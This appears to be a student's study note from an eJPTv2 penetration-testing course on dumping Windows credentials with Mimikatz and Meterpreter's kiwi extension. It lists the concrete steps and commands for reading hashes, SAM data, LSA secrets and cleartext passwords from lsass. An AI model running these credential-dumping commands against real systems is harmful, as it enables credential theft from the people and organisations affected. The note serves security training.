Tags: #template 
Related to: #note-taking, #notes
See also: 
Index: [[📁EJPTv2 - INDEX]] 

#### Summary
Add a brief overview of what the content is

#### Content
Mimikatz - post exploitation tool

Can be used to extract hashes from lsass.exe process memory

Alternatively we can use meterpreter extention kiwi if we have a meterpreter session.

Requires elevated privs to run correctly.

---
Using kiwi to dump
---
Get initial access on system
get a meterpreter shell
find and migrate to lsass.exe
load kiwi
use ? get all options
creds_all, lsa_dump_sam, lsa_dump_secrets

or 
Using mimicatz
---
upload mimicatz - upload /usr/share/windows/mimikatz/x64/mimicatz.exe
run mimicatz from shell
check if u have privs - privilege::debug
lsadump::sam - dumps sam database
lsadump::secrets - dumps secrets
sekurlsa::logonpasswords - can find if any cleartext passwords are stored




###### References  (optional )